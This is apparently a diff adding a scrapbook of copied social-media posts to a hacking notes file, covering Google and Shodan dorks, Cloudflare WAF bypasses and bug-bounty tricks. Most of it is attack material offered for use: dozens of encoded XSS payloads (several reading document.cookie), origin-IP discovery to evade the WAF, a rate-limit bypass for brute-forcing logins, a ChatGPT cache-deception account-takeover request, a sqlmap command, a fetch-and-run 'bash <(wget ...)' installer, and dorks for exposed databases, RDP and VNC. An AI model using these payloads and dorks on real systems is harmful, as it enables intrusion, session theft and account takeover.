@@ -310,6 +310,128 @@ https://lab.wallarm.com/xxe-that-can-bypass-waf-protection-98f679452ce0/
 https://waf-bypass.com/tag/xxe/
 
 
+
+
+
+
+
+
+
+https://github.com/IvanGlinkin/Fast-Google-Dorks-Scan
+https://github.com/AnonymousJass/OSINT-Google-Dorks
+
+
+Dorking is a technique that uses advanced search operators within Google Search and other search engines to find information. Primarily used to locate security holes in the configuration and computer code within websites, Dorks can also provide investigators with opportunities to enhance intelligence gathering during OSINT investigations.
+
+Advanced search operators are special commands within search engines that modify searches by adding parameters to narrow searches and drill deeper into results.
+
+We’ve outlined 14 advanced search operators that can be useful to investigators to refine search results, which include:
+
+“search term” = exact phrase, i.e. "Skopenow streamlines your due diligence and claims process"
+Quotation marks enable users to force an exact match for required words or phrases. The exact match operator can be used to refine results to ensure that a specific phrase is included in the results or to exclude synonyms when searching for single words. Searching for an exact phrase during an investigation can locate material written by a specific person or business.
+
+OR or | = either search term or search term, i.e. Ed OR Edward or Ed|Edward|Edwin
+The OR operator enables searching for multiple words as alternatives to one another, locating either X or Y or both. The pipe (|) operator functions identically to “OR”. Investigators can utilize the OR operator when only a nickname is known for a subject, enabling different variations of the same name to be searched at once.
+
++ or AND = search term and search term, i.e. Steve Adams AND Skopenow
+The AND operator enables searching for results that must include two different words phrases, searching for both X and Y. Results will only include results that include both search phrases. The plus (+) operator can also be used in place of “AND”. AND can be useful for investigators when searching for information on a person, ensuring results relate to them by including their employer’s name.
+
+- = Not search term, i.e. Skopenow -www.skopenow.com
+The minus operator enables users to exclude a word or phrase from search results. When results are extensive, removing irrelevant words that feature prominently in numerous results is particularly useful when looking to reduce results.
+
+site: = Only on this site, i.e. “Skopenow” site:twitter.com
+The site operator enables users to restrict results to only those from a specific website. When investigating a business, the site operator can ensure results come specifically from their official website.
+
+filetype: = Only this type of file, i.e. OSINT filetype:pdf OR filetype:docx
+The filetype operator enables search results to be restricted to those that are a specific file type, removing other file types and standard web pages. filetype: can provide benefit during an investigation when searching for contracts and whitepapers in PDF or Word documents.
+
+intitle: = Only show results where text is in title of site, i.e. intitle:final.attendee.list "Fraud"
+The intitle operator enables users to find web pages with a certain word or phrase in the title. Investigators can use the intitle operator to find relevant web pages and articles containing a relevant keyword.
+
+inurl: = Only show results where text is in the web address of a website, i.e. inurl:resume “john smith”
+The inurl operator enables users to find web pages with a certain word or phrase in the web address. Investigators can use the inurl operator to find relevant web pages containing a keyword in the web address.
+
+intext: = Only show results where text is in the main body of the text of a website, i.e. Skopenow intext:OSINT
+The intext operator enables users to find web pages with a certain word or phrase in the main text of the web page. Investigators can use the intext operator to locate results where a keyword within the body of a web page will limit results, such as a year or location name.
+
+allintext: = locate all words in a web page, i.e. allintext: skopenow insurance fraud
+The allintext operator enables users to find web pages that contain a list of keywords in the main text of the web page but not necessarily next to one another. Investigators can use the allintext operator when more than one keyword is necessary as an anchor within the body of a webpage to find results, such as multiple keywords or names related to a crime.
+
+cache: = Only show cached links, i.e. cache:skopenow.com
+The cache operator enables users to return the most recently cached version of a webpage when the web page has been indexed. Investigators can use the cache operator to locate previous versions of edited or deleted web pages to locate removed intelligence.
+
+* = wildcard, i.e. "robdouglas*com"
+The asterisk operator represents a wildcard within search strings, taking the place of words or phrases between two keywords. Investigators can use the asterisk operator to find email addresses by replacing the domain name with the wildcard character.
+
+map: = map a specific location, i.e. map: Manhattan
+The map operator enables users to force Google to show map results for a locational search. The results show only location-specific data and do not include recent news stories. Investigators can use the map operator to focus on geospatial relevant intelligence.
+
+Skopenow augments investigations by instantly building comprehensive, court-ready, digital reports on businesses and individuals. Skopenow collects, collates, and analyzes information from data sources, including social media, the dark web, associated vehicles, court records, and contact data. Sign up for a 7-day free trial of Skopenow at: https://www.skopenow.com/try.
+
+
+
+
+
+
+
+
+
+
+
+Advanced Search Operators
+Quotes
+To find an exact sentence or phrase, use quotation marks
+For example, “OSINT tools for social media”
+Exclusions
+Use a minus sign to exclude words or certain sites
+For example, -tweet or -Twitter.com
+Logic
+Use OR or the symbol | with no spaces
+For example: Authentic8 OR NeedleStack, alternatively Authentic8|NeedleStack
+Extensions
+To find a certain filetype, use filetype: (followed by a colon) or ext:
+Then add PDF, jpg, png, et al., after the colon (follow ext with a colon and the file type, no spaces)
+For example, ext:jpg NeedleStack logo
+To look for multiple file types, use parentheses around your search, such as ext:(jpg OR pdf OR png)
+Intitle, Intext and Inurl
+To find specific text in a title, the text of a site page or the url, simply search Intitle: followed by your query. 
+For example, Inurl:zero-trust-managed-devices or Intitle:FAQ
+Adding all to the beginning of any of these will only reveal results that only meet the criteria of all of the parameters
+Such as, allintext:”dangers of free Wi-Fi”
+Site
+To only search within a certain site, use site: (with no spaces) in front of your query
+For example, Site:authentic8.com “Google Dorking”
+Timestamps
+To find a site posted before or after a specific date, you can use after:[date] or before:[date] 
+For example, before:2016
+Fill in the blank
+Using an asterisk allows Google to fill in a possible missing word. For instance, to find an email address, you can use [username]*com
+For example: NeedleStack*com
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+site:example.com ext:doc | ext:docx | ext:odt | ext:rtf | ext:sxw | ext:psw | ext:ppt | ext:pptx | ext:pps | ext:csv 
+site:s3.amazonaws.com + example.com
+site:accounts.example.com inurl:user_id
+site:example.com inurl:login | inurl:signin | intitle:Login | intitle:"sign in"
+
 The endpoint on ██████ accepts a POST request with an XML document. A Web-Application Firewall 
 (WAF) successfully blocked all requests that contained any of the keywords <!DOCTYPE, <!ENTITY or <!ELEMENT, 
 that are necessary for XXE attacks to be successful. However, it was possible
@@ -321,4 +443,1129 @@ https://gowsundar.gitbook.io/book-of-bugbounty-tips/bypasses....................
 
 
 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+If you find a file upload function for an image, try introducing an image with XSS in the filename like so 👇
+
+<img src=x onerror=alert('XSS')>.png
+"><img src=x onerror=alert('XSS')>.png
+"><svg onmouseover=alert(1)>.svg
+<<script>alert('xss')<!--a-->a.png
+
+
+
+Bounty Friday 💵
+
+Bug Type : Cloudflare XSS bypass
+
+Payload : %22%3E%3Csvg%20onload%3dalert%26%230000000040%22100%22)%3E
+
+Method: Found a parameter q= while spidering the site and injection of the above payload lead to cloudflare bypass resulting in XSS
+
+
+
+
+
+
+1. Reflected XSS via Cloudflare Bypass ($300)
+
+The Cloudflare was blocking script tags and it's bypasses and also it was blocking the regex that matches on/w+= string so it was not possible to directly use the event-handlers. Was able to bypass the regex match using below payload:
+
+--><svg%20onload=alert%26%230000000040document.cookie)>
+
+2. Iframe Injection ( $225)
+3. Small Misconfiguration with Authentication. ($50)
+4. XSS on a POST request ( Amazon Voucher)
+
+#bughunting #bugbountytips #bugbounty 
+#bugbountytip #vapt #ethicalhacking 
+
+
+
+
+Cloudflare XSS bypass, payload reflected in the script tag
+Payload : </script><embed/embed/embed/src=//14.rs>
+
+
+
+
+Cloudflare XSS protection bypass:
+
+"><Svg Only=1 OnLoad=confirm(atob("Q2xvdWRmbGFyZSBYU1MgQG1fa2VsZXBjZQ=="))>
+
+#bugbounty #bugbountytips
+
+
+
+
+
+📌 Cloudflare XSS Protection Bypass 👇
+
+"><Svg Only=1 OnLoad=confirm(atob("Q2xvdWRmbGFyZSBYU1MgQG1fa2VsZXBjZQ=="))>
+
+⚡ Credit- m_kelepce
+
+
+
+
+
+
+
+The word "on" is very important to Bypass Waf on Cloudflare
+
+For Example:
+
+<svg/Animation/onload=alert(1)>
+<svg/hackerone/onload=alert(1)>
+'">one,two<svg/onload=alert(1)>
+
+still there is "on" word.Soo it can also Bypass the WAF.
+
+
+
+
+
+
+
+
+Tool: CrimeFlare
+-->This tool serves to find the original IP behind websites that have been protected by Cloudflare
+
+Link: https://lnkd.in/e4ATrfGf
+
+
+
+
+
+Stored XSS - Cloudflare bypass
+
+Payload : javaScRipt:Alert(‘1’)
+
+
+
+
+
+In my latest premium post on The Web Scraping Club substack (https://lnkd.in/d7UX8V_E) I've written about a new technique I've experimented for bypassing Cloudflare bot protection.
+
+#webscraping #bot #webdata #scraping #scrapy
+
+
+
+
+
+
+WAF Bypass (Cloudflare)
+Eg - abc[dot]com
+
+Check if Website is using Cloudflare, there are various methods to know this but easiest will be Wappalyzer browser Ext.
+
+Procedure:
+
+1) Find IP Address of abc[dot]com. Using Ping Method
+2) Login into Shodan and search: hostname:abc[dot]com (It will list down all origin IPs)
+3) Try to Open each IP address Manually, It could lead to bypassing WAF and Cloudflare. #bypass #WAF #cloudflare
+
+
+
+
+
+
+Installation Linux
+
+bash <(wget -qO- https://git.io/vAtmB)
+
+CMS scaner
+Dorks for osint
+bug bounty one liner
+Exploitation Tools:
+ATSCAN
+sqlmap
+Shellnoob
+Commix
+FTP Auto Bypass
+JBoss Autopwn
+Web Hacking:
+Drupal Hacking
+Inurlbr
+Wordpress & Joomla Scanner
+Gravity Form Scanner
+File Upload Checker
+Wordpress Exploit Scanner
+Wordpress Plugins Scanner
+Shell and Directory Finder
+Joomla! 1.5 - 3.4.5 remote code execution
+Vbulletin 5.X remote code execution
+BruteX - Automatically brute force all services running on a target
+Arachni - Web Application Security Scanner Framework
+
+
+
+
+
+
+
+
+
+
+
+Reflected XSS CloudFlare Bypass
+
+Endpoint -> https://whatever .com/search-results/?keyword=test
+
+Payload was being reflected in
+<input type="text" value="payload">
+
+Payload tried:
+test" onmouseover="alert('XSS') -> Blocked
+
+Done some encoding ->
+test"%20onmouseover="alert%26%2300000000000000000040;%27XSS%27%26%2300000000000000000041;
+
+Still didn't worked "alert" was sanitized
+So instead of alert I used prompt
+
+test"%20onmouseover="prompt%26%2300000000000000000040;%27XSS%27%26%2300000000000000000041;
+
+BOOM, It Worked💥💥
+
+From now onward will share such things here & Will start sharing writeups on my
+
+
+
+
+
+
+
+Open Redirect to XSS Cloudflare Bypass
+
+https://lnkd.in/gW7QReKs
+
+
+
+
+
+
+
+
+
+
+Bug Type: Cloudflare DDOS Protection Bypass via Origin IP.
+
+Tip: It was a simple catch. Found origin IP using shodan dorks by using organization name found through SSL cert and tried multiple attacks on IP instead of the domain name and Cloudflare was not bothering me.
+
+shodan dork-->
+
+ssl:"XYZ corporated"
+
+
+
+
+
+
+
+
+
+Cloudflare XSS Bypass:
+<img src=x onVector=X-Vector onerror=alert(1)>
+
+
+
+
+
+Cloudflare XSS Bypass ✌🏻
+
+Payload:
+"><sVg/OnLuFy="X=y"oNloaD=;1^confirm(1)>/``^1//
+
+
+
+
+Cloudflare XSS protection bypass payload:
+"><Svg Only=1 OnLoad=confirm(atob("Q2xvdWRmbGFyZSBYU1MgQG1fa2VsZXBjZQ=="))>
+
+
+
+
+
+
+
+
+
+
+
+
+Malicious PyPi packages create CloudFlare Tunnels to bypass firewalls
+
+Six malicious packages on PyPI, the Python Package Index, were found installing information-stealing and RAT (remote access trojan) malware while using Cloudflare Tunnel to bypass firewall restrictions for remote access.
+
+Full post:
+https://lnkd.in/ev3XKvsm
+
+
+
+
+
+
+
+https://medium.com/@ag3n7/how-i-bypassed-cloudflare-waf-to-get-my-first-bug-f02dab3a2d10
+
+
+
+
+3-Ways to Bypass Anti-bot Reverse Proxy:
+
+If a reverse proxy(Eg: Cloudflare Antibot Technology) is in place, it can be more difficult to determine the IP address of the origin server. However, there are a few methods that can be used to try and identify the end server IP address:
+
+1. Look for X-Forwarded-For headers: Reverse proxies often add X-Forwarded-For headers to requests that are forwarded to the origin server. These headers can contain the IP address of the client that made the request as well as the IP address of the last proxy server in the chain. By examining these headers, it may be possible to determine the IP address of the origin server.
+
+2. Check DNS records: It may be possible to determine the IP address of the origin server by examining the DNS records for the domain name. If the reverse proxy is configured to use a specific subdomain or IP address to forward traffic to the origin server, this information may be visible in the DNS records.
+
+3. Use traceroute or a network sniffer: It may be possible to use traceroute or a network sniffer to trace the path of a request from the client to the origin server. This can help to identify the IP address of the origin server.
+
+It's important to note that attempting to bypass the reverse proxy or access the origin server directly can be a violation of website terms of service or even illegal. It's best to only attempt to identify the origin server IP address for legitimate reasons and to contact the website administrator or support team for assistance if needed.
+
+
+
+
+
+
+
+
+One more write-up ✍️✍️ on, How I can able to inject JavaScript into the application through Chatbot 🔥🔥 with a Video POC
+
+Stored XSS via Chatbot - Cloudflare Bypassed 😉
+.
+.
+.
+.
+Link: https://lnkd.in/gBTnNQM2
+
+
+
+
+
+
+
+
+
+
+
+
+
+How can you Hack into any ChatGPT account, including saved conversations, account status, chat history and more!
+
+A tale of 4 ChatGPT vulnerabilities 👇
+
+We can discuss it now that the #OpenAI team has confirmed it's completely fixed.
+--
+In pic1 :-
+we are getting a "HIT" cache status of an API request (not a static file).
+
+This means an "API" request is cached since Cloudflare thinks this is a static file request that needs to be cached.
+
+Hence you can forge an exploit based on a URL like pic2 :
+GET /backend-api/conversations%0A%0D-testtest.css?offset=0&limit=20
+
+Send it to a victim, and upon accessing it – his own "API" response will be cached, and if you recheck the same URL (i.e. fetching the cached response of the victim), you will be able to see the victim's HTTP response, which contains the conversations' titles.
+
+This is called a cache deception attack
+--
+Now getting to the juicy part—there is more to it.
+
+In pic 3 new vector to bypass the fix of the original account takeover attack
+
+So u can appended the URL-encoded representation of tabulation (\t) – %09, and that Payload (%0A%0D%09), WORKED 🫠
+
+And here, you can able to bypass OpenAI fix of the original account takeover issue with a new payload, which brings this issue back to life – taking over any user account lik pic4
+
+by Gal Nagli
+
+https://lnkd.in/dkHXjuUu
+
+
+
+
+
+
+
+
+
+
+
+
+Have you ever found a great exploit in a web app test, only to be blocked by Cloudflare? Consider this trick to pull the origin server IP and (hopefully) bypass the CDN entirely:
+ 
+Cloudflare works as an intermediary between the client and server. If we can get the origin server IP, we can bypass all protections the Cloudflare CDN is providing (WAF, DDOS protection, etc).
+ 
+Now how can we do it? We can target the ‘Forgot Password’ feature of the application. Assuming the mail server is hosted by the same IP address as the web server, a threat actor could find the IP Address from a header within the outgoing email. See the attached screenshot for where to find this.
+ 
+If this does not work, you can also send an email to a non-existent email address on the target server (EX: non-existent@target[.]com). This will cause a bounce (because the user doesn’t exist) and the delivery will fail, resulting in receiving back a notification containing the Origin IP of the server sending the email.
+ 
+As long as there are no security measures/virtual hosting restrictions that prevent the application from loading directly on the discovered origin IP, then we can successfully bypass Cloudflare! If you have any other tricks/tips, feel free to let me know in the comments.
+
+
+
+
+
+
+
+
+
+bypass cloudflare XSS
+<svg onload=prompt%26%23x000000028;document.domain)>
+<svg onload=%0Aalert1>
+
+<svg onload=alert%26%230000000040"1")>
+%2sscript%2ualert()%2s/script%2u
+<svg on onload=(alert)(document.domain)>
+<svg onload=alert%26%230000000040"")>
+
+
+
+
+
+
+
+
+
+Bypass Cloudflare Rate Limit 2022
+
+1. Go to login page
+2. Enter credentials
+3. Send request to intruder
+4. Set change position for host header
+5. Set change position for password
+6. Enjoy brute forcing
+
+Twitter: https://lnkd.in/eK5sTu2r
+Github: https://lnkd.in/eaDRV3JE
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+hello guys, I just get xss from bypass cloudflare
+the payload:"/><Svg Only=1 OnLoad=confirm(1)>
+
+
+thanks to : https://lnkd.in/dcBqyaF9
+
+you can find a lot of bypasses at https://waf-bypass.com/
+
+
+
+
+
+
+
+Bypass cloudflare using padding technique
+
+$python -c "print '\n'*132000" > test1.html
+$shell cat test.html >> test1.html
+
+source : https://lnkd.in/gAQNH9Jz
+
+
+
+
+
+
+
+How to ByPass Cloudflare WAF completely, even with authenticated pulls and IPTables rules in your Origin Server (Pre-Requisite, get the Origin IP or just start mapping the full IPV4 range)
+
+Como Bypassar completamente o WAF da Cloudflare, mesmo com Authenticated Pull ativado e Regras de IPTables com IP de origem no seu servidor de origem (Pré-Requisito, Obter o IP de origem ou simplesmente comece a mapear todos os IPV4s)
+
+https://lnkd.in/dcUbaEfJ
+
+
+
+
+
+
+
+
+
+
+
+
+Technique to bypass cloudflare protection (XSS). Try this payload :
+
+<iframe src="data:image/svg+xml;base64,CjxzdmcgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KICA8aW1hZ2UgaHJlZj0ieCIgb25lcnJvcj0iamF2YXNjcmlwdDphbGVydCgncHduZWQgZXJuYW5zJykiIC8+Cjwvc3ZnPg=="/>
+
+
+
+
+
+
+
+Cloudflare WAF Bypass
+Soon I will share my methodology for bypassing different WAFs
+
+<logicalhunter/onmouseover=%0aalert%26%230000000096%3b1%26%230000000096%3b>Click Here
+
+<a/HREF="Javas%26%2399;ript:%0Athrow onerror=al\u0065rt,document.cooki\u0065">Click Here
+
+
+
+The payload I utilized was the following:
+"><svg/onload=alert%26%230000000040"Hacked")>
+
+
+
+
+
+
+
+https://www.bleepingcomputer.com/news/security/malicious-pypi-packages-create-cloudflare-tunnels-to-bypass-firewalls/
+
+
+
+
+
+
+
+
+
+
+
+When I try to input multiple XSS payloads the result is :
+𝗜𝗻𝗽𝘂𝘁 :
+javascript:location=(alert)()
+𝗥𝗲𝘀𝗽𝗼𝗻𝗱𝘀 :
+[Blocked WAF]
+
+𝗦𝗼𝗹𝘂𝘁𝗶𝗼𝗻𝘀 :
+1. Via open.Lo;cation
+𝗷𝗮𝘃𝗮𝘀𝗰𝗿𝗶𝗽𝘁:𝗼𝗽𝗲𝗻.𝗟𝗼;𝗰𝗮𝘁𝗶𝗼𝗻=(𝗮𝗹𝗲𝗿𝘁)(𝟭)
+
+2. Via close.Lo;cation
+𝗷𝗮𝘃𝗮𝘀𝗰𝗿𝗶𝗽𝘁:𝗰𝗹𝗼𝘀𝗲.𝗟𝗼;𝗰𝗮𝘁𝗶𝗼𝗻=(𝗮𝗹𝗲𝗿𝘁)(𝟭)
+
+3. Via true.Lo;cation
+𝗷𝗮𝘃𝗮𝘀𝗰𝗿𝗶𝗽𝘁:𝘁𝗿𝘂𝗲.𝗟𝗼;𝗰𝗮𝘁𝗶𝗼𝗻=(𝗮𝗹𝗲𝗿𝘁)(𝟭)
+
+4. Via false.Lo;cation
+𝗷𝗮𝘃𝗮𝘀𝗰𝗿𝗶𝗽𝘁:𝗳𝗮𝗹𝘀𝗲.𝗟𝗼;𝗰𝗮𝘁𝗶𝗼𝗻=(𝗮𝗹𝗲𝗿𝘁)(𝟭)
+
+5. Via origin.Lo;cation
+𝗷𝗮𝘃𝗮𝘀𝗰𝗿𝗶𝗽𝘁:𝗼𝗿𝗶𝗴𝗶𝗻.𝗟𝗼;𝗰𝗮𝘁𝗶𝗼𝗻=(𝗮𝗹𝗲𝗿𝘁)(𝟭)
+
+𝗨𝗣𝗗𝗔𝗧𝗘 𝗡𝗲𝘄 𝗣𝗮𝘆𝗹𝗼𝗮𝗱 :
+javascript:this.docu;ment=(alert)()
+javascript:true.th;is=(alert)()
+javascript:true.ev;al=(alert)()
+javascript:true.cl;ose=(alert)()
+javascript:true.ori;gin=(alert)()
+javascript:true.op;en=(alert)()
+javascript:false.tr;ue=(alert)()
+javascript:true.fal;se=(alert)()
+
+𝗖𝗼𝗻𝗰𝗹𝘂𝘀𝗶𝗼𝗻 :
+And WAF doesn't block the above payload so XSS is triggered.
+In this case the WAF used is Cloudflare.
+Using a 𝘀𝗲𝗺𝗶𝗰𝗼𝗹𝗼𝗻 ( ; ) on location can bypass WAF so adding values ​​before location in the form of 𝗼𝗽𝗲𝗻, 𝗰𝗹𝗼𝘀𝗲, 𝘁𝗿𝘂𝗲, 𝗳𝗮𝗹𝘀𝗲, 𝗼𝗿𝗶𝗴𝗶𝗻 can make location with 𝘀𝗲𝗺𝗶𝗰𝗼𝗹𝗼𝗻 work.
+
+𝗘𝘅𝗮𝗺𝗽𝗹𝗲 𝗿𝗲𝘀𝘂𝗹𝘁𝘀:
+https://lnkd.in/gkk2puSQ
+
+
+
+
+
+
+
+
+
+
+Hackers need website's real IP address to exploit its vulnerability. That's why websites use Cloudflare to hide the real IP. But, Shodan can be used to find the real IP. Here is how- https://lnkd.in/g92KpuDE
+
+In addition, Canary Token is used so that whenever someone opens your document, you'll get an alert. But, it can be bypassed. Here is the details- https://lnkd.in/gD3HmZn8
+
+
+
+
+
+
+Payload used for bypassing cloudflare:
+1. "><sVg/onfake="x=y"oNload=;1^(co\u006efirm)``^1//
+2. "><img%20src=x%20onmouseover=prompt%26%2300000000000000000040;document.cookie%26%2300000000000000000041;
+
+
+
+
+
+
+
+
+
+“The researchers discovered that appending JSON syntax to SQL injection payloads allows bypassing the WAF because it is unable to parse it.”
+
+https://lnkd.in/gjEn_AU
+
+https://securityaffairs.co/wordpress/139445/hacking/web-application-firewalls-waf-bypass.htmlm
+
+
+
+
+
+
+
+
+
+
+
+Did you read about the latest SQL injection vector that takes advantage of JSON support in SQL? It bypassed Imperva, PaloAlto, Cloudflare, AWS, and F5 WAFs.
+
+But once again, Contrast Protect stopped it out of the box - without any changes. Because our runtime protection has much more context than a WAF. Our customers' apps and APIs were completely protected from....
+* Struts EL injection
+* Log4Shell
+* Spring4Shell
+* Atlassian EL Injection
+* and many others
+Protect prevents exploitation of both zero-days in libraries *and* custom vulnerabilities in your app/api code. You can dramatically reduce the risk from SQL Injection, EL Injection, command injection, XSS, CSRF, SSRF, XXE, path traversal, and most of the other major types of vulnerability. No more firedrills.
+
+
+
+https://www.contrastsecurity.com/security-influencers/json-based-sql-attacks-bypassed-wafs-but-not-contrast-protect
+
+
+
+
+
+
+
+
+
+
+
+
+
+Excited to share that I've been working multiple solutions to bypass censorship and restrictions, available on GitHub! 🚀✨
+
+It's been a long journey of continuous learning and knowledge acquisition from many great experts, too many to name. The goal wasn't just about building a VPN, but learning the technologies and staying up-to-date with the latest industry trends and best practices. It's definitely not the fastest VPN out there, but connects like a knife through butter under very restricted circumstances (:
+
+The repository explains how to:
+- 🚀 Build a vanilla VPN using X-UI dashboard
+- 🗝️ Add TLS to improve security
+- 🚅 Improve speed with Google's congestion control algorithm
+- 👻 Add IPv6
+- 🧱 Move behind Cloudflare CDNs
+- ❄️ Use Tunneling to build two-layer VPNs
+- ⚒️ Leverage Cloudflare Workers (CFW)
+
+https://lnkd.in/ePMCSV_d
+
+
+
+
+
+
+
+
+
+
+🧨 Remote Code Execution in #Atlassian Bitbucket Server and Data Center (CVE-2022-36804)
+
+You can search for vulnerable hosts in Shodan using dork:
+
+http.html:"Atlassian Bitbucket"
+
+The PoC is shown in the image below.
+
+Vulnerable versions can be viewed here, and vulnerability analysis in the article at the link.
+https://lnkd.in/d7Jd5Xhw
+
+
+
+
+
+
+
+
+
+
+Did shodan Recon on Old target got an IP for Jira Service ,Probed Ports and saw it was running on 8443 (This means website was only accessible in format http://ipaddress:8443)
+
+After being able to access the website I looked for Jira CVEs and got rewarded.
+
+Shodan Dork: ssl:target.com 200
+
+
+
+
+
+
+
+
+
+
+
+
+Are you a Bug Bounty Hunter on the lookout for vulnerabilities and security loopholes? 🕵️‍♂️ Look no further! Here are some powerful Shodan dorks that can supercharge your hunt and help you uncover hidden gems 💎 in your target systems. These dorks are like a secret map to vulnerabilities, just waiting to be discovered!
+
+org:"http://target.com" - Explore a specific organization's assets.
+http.status:"<status_code>" - Find web pages with a specific HTTP status code.
+product:"<Product_Name>" - Target specific software or product names.
+port:<Port_Number> "Service_Message" - Search for services by port number and service message.
+port:<Port_Number> "Service_Name" - Filter by port and service name.
+http.component:"<Component_Name>" - Discover specific web components.
+http.component_category:"<Component_Category>" - Focus on a specific category of web components.
+http.waf:"<firewall_name>" - Identify websites protected by a specific firewall.
+http.html:"<Name>" - Search for HTML content with a specific name.
+http.title:"<Title_Name>" - Hunt for web pages with a specific title.
+ssl.alpn:"<Protocol>" - Target servers supporting a specific ALPN protocol.
+http.favicon.hash:"<Favicon_Hash>" - Find websites based on favicon hashes.
+net:"<Net_Range>" - Search within a specific IP range.
+http://ssl.cert.subject.cn:"http://Domain.com" - Locate SSL certificates for a given domain.
+asn:"<ASnumber>" - Explore assets based on Autonomous System Numbers.
+hostname:"<hostname>" - Discover assets based on specific hostnames.
+ip:"<IP_Address>" - Target assets with a specific IP address.
+all:"<Keyword>" - Search for assets based on a keyword.
+"Set-Cookie: phpMyAdmin" - Identify systems using phpMyAdmin.
+"Set-Cookie: lang=" - Hunt for systems with a specific language cookie.
+"Set-Cookie: PHPSESSID" - Locate sessions using PHPSESSID.
+"Set-Cookie: webvpn" - Find systems using web VPN cookies.
+"Set-Cookie:webvpnlogin=1" - Discover systems with specific web VPN login cookies.
+"Set-Cookie:webvpnLang=en" - Target systems with web VPN language cookies.
+"Set-Cookie: mongo-express=" - Identify systems with mongo-express cookies.
+"Set-Cookie: user_id=" - Hunt for systems with user_id cookies.
+"Set-Cookie: phpMyAdmin=" - Uncover systems using phpMyAdmin cookies.
+"Set-Cookie: _gitlab_session" - Locate GitLab session cookies.
+"X-elastic-product: Elasticsearch" - Discover systems using Elasticsearch.
+"x-drupal-cache" - Identify systems with Drupal cache headers.
+"access-control-allow-origin" - Hunt for permissive CORS configurations.
+"WWW-Authenticate" - Locate systems requiring authentication.
+"X-Magento-Cache-Debug" - Discover Magento cache debugging information.
+"kbn-name: kibana" - Identify systems using Kibana.
+
+Happy hunting, fellow bug bounty enthusiasts!
+
+
+
+
+
+
+
+Source code disclosure in PHP Development Server <= 7.4.21
+
+Using Shodan dork: PHP/7.4.21
+
+
+
+
+
+
+
+
+
+
+Some Shodan Dorks that might useful in Bug Bounty.
+
+1. org:"http://target.com"
+2. http.status:"<status_code>"
+3. product:"<Product_Name>"
+4. port:<Port_Number> “Service_Message”
+5. port:<Port_Number> “Service_Name”
+6. http.component:"<Component_Name>"
+7. http.component_category:"<Component_Category>
+8. http.waf:"<firewall_name>"
+9. http.html:"<Name>"
+10. http.title:"<Title_Name>"
+11. ssl.alpn:"<Protocol>"
+12. http.favicon.hash:"<Favicon_Hash>"
+13. net:"<Net_Range>" (for e.g. 104.16.100.52/32)
+14. http://ssl.cert.subject.cn:"<http://Domain.com>"
+15. asn:"<ASnumber>"
+16. hostname:"<hosthame>"
+17. ip:"<IP_Address>"
+18. all:"<Keyword>"
+19. “Set-Cookie: phpMyAdmin”
+20. “Set-Cookie: lang="
+21. “Set-Cookie: PHPSESSID"
+22. “Set-Cookie: webvpn”
+23. “Set-Cookie:webvpnlogin=1"
+24. “Set-Cookie:webvpnLang=en”
+25. “Set-Cookie: mongo-express="
+26. “Set-Cookie: user_id="
+27. “Set-Cookie: phpMyAdmin="
+28. “Set-Cookie: _gitlab_session”
+29. “X-elastic-product: Elasticsearch”
+30. “x-drupal-cache”
+31. “access-control-allow-origin”
+32. “WWW-Authenticate” 
+33. “X-Magento-Cache-Debug”  
+34. “kbn-name: kibana”
+join WhatsApp group:-https://lnkd.in/dTiBryT6
+
+
+
+
+
+
+
+
+
+
+
+
+
+🕵️‍♂️💻 Happy Hunting in the World of Bug Bounties! 🐛🛡️
+
+Are you a bug bounty hunter on the lookout for potential vulnerabilities? 🔍🔦 Shodan, the search engine for the Internet of Things, can be an excellent tool to aid you in your quest! Here are some useful Shodan dorks that may help you discover potentially vulnerable or misconfigured devices:
+
+1. 🌐 Apache Default Page:
+`apache country:"YOUR_COUNTRY_CODE" title:"Index of /" -"Forbidden"`
+
+2. 🔒 Default Login Pages:
+`"login:" "password" country:"YOUR_COUNTRY_CODE"`
+
+3. 🔍 Open Elasticsearch Instances:
+`port:9200 country:"YOUR_COUNTRY_CODE"`
+
+4. 🍃 Exposed MongoDB Databases:
+`port:27017 country:"YOUR_COUNTRY_CODE"`
+
+5. 🏗️ Misconfigured Jenkins Instances:
+`"http.title:Dashboard" "jenkins country:YOUR_COUNTRY_CODE"`
+
+6. 🔒 Unsecured VNC:
+`"RFB 003.003" port:5900 country:"YOUR_COUNTRY_CODE"`
+
+7. 🖥️ Open RDP (Remote Desktop Protocol) Services:
+`port:3389 country:"YOUR_COUNTRY_CODE"`
+
+8. 🔄 Exposed Redis Instances:
+`port:6379 country:"YOUR_COUNTRY_CODE"`
+
+9. 📂 Insecure FTP Servers:
+`port:21 country:"YOUR_COUNTRY_CODE"`
+
+10. 🐈 Misconfigured Apache Tomcat:
+`"Apache Tomcat" country:"YOUR_COUNTRY_CODE"`
+
+
+
+
+
+
+
+
+
+https://infosecwriteups.com/from-shodan-dork-to-grafana-local-file-inclusion-e77dc4cfc264
+
+
+
+
+
+
+
+Alert
+CVE-2023-20214 #Cisco SD-WAN #vManage Critical(9.1
+) #Unauthenticated #REST API Access #Vulnerability
+
+https://lnkd.in/gUsRw3yx
+
+Other Dorks:
+
+Shodan http.html:"Cisco SD-WAN"
+FOFA body="Cisco SD-WAN"
+
+Refer to
+
+https://lnkd.in/gK-JUVat
+
+
+
+
+
+
+
+How to find SQLI using Shodan
+1. Shodan dork: SSL:""
+2. Found employee's admin portal and username input vulnerable to sqli.
+3. Sqlmap command:
+Sqlmap -r req.txt --batch --force-ssl --level 5 --risk 3 --dbs --hostname --current-user -p "username"
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Top Shodan Dorks
+
+title:”kibana” port:”443"
+”230 login successful” port:”21"
+vsftpd 2.3.4 port:21
+230 ‘anonymous@’ login ok
+set-cookie: webvpn;
+Siemens S7
+vsftpd 3.0.3
+Set-Cookie: phpMyAdmin
+Set-Cookie: lang=
+Set-Cookie: PHPSESSID
+Set-Cookie: webvpn
+Set-Cookie:webvpnlogin=1
+Set-Cookie:webvpnLang=enHow to do this appropriately
+Set-Cookie: mongo-express=
+Set-Cookie: user_id=
+Set-Cookie: phpMyAdmin=
+Set-Cookie: _gitlab_session
+X-elastic-product: Elasticsearch
+x-drupal-cache
+access-control-allow-origin
+WWW-Authenticate
+X-Magento-Cache-Debug
+kbn-name: kibana
+X-App-Name: kibana
+x-jenkins
+org:’company’ port:’80, 81, 443, 8000, 8001, 8008, 8080, 8083, 8443, 8834, 8888'.
